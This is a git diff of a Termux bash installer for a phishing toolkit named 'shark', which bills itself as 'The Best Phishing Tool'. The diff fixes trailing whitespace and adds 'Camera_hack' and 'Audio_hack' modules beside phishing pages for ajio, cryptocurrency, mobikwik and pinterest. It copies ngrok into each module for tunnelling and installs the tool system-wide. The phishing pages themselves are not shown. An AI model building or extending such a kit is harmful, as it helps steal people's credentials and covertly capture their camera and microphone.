@@ -1,7 +1,7 @@
 #!/data/data/com.termux/files/usr/bin/bash
 clear
-echo 
-echo 
+echo
+echo
 echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Best Phishing Tool Please Wait \e[0m"
 echo
 termux-setup-storage
@@ -60,6 +60,8 @@ cp -R ngrok phs/ajio/
 cp -R ngrok phs/cryptocurrency/
 cp -R ngrok phs/mobikwik/
 cp -R ngrok phs/pinterest/
+cp -R ngrok phs/Camera_hack
+cp -R ngrok phs/Audio_hack
 clear
 echo ""
 echo ""
@@ -75,14 +77,14 @@ sleep 1
 clear
 echo
 echo -e "\e[92m[+] Setting up shark \e[m "
-echo 
+echo
 cp -R phs /data/data/com.termux/files/usr/bin
 cp -R shark /data/data/com.termux/files/usr/bin
 ###########XXXXXXXXXXXXX####################
 #     JUST LEARNING KEEP SUPPORTING        #
 ############XXXXXXXXXXXX####################
 echo -e "\e[92m[+] To run the tool from anywhere simply type : shark \e[m "
-echo 
+echo
 #####################################
 #           THANKYOU                #
 #####################################
